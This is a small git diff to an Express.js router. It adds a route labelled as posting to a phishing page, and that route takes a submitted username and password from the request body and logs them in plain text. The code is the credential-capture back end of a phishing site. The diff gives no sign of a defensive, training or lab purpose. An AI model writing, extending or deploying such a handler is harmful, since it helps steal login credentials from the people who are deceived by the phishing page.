@@ -5,5 +5,13 @@ var router = express.Router();
 router.get('/', function(req, res, next) {
   res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
 });
+// post to phishing page 
+router.post('/phish', function(req,res, next) {
+
+  var user = req.body.user;
+  var password = req.body.password;
+  console.log(`User name = ${user}, password is ${password}`);
+
+});
 
 module.exports = router;
